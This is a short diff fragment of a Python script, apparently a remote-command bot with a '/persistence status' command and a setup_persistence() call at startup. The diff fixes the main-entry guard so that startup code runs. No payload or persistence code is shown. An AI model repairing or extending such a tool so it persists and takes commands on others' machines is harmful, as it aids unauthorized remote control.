@@ -250,7 +250,7 @@ elif data == "/persistence status":
 except Exception as e:  
     print(f"CMD function error: {e}")
 
-if name == "main":
+if __name__ == "__main__":
 try:
 setup_persistence()
 
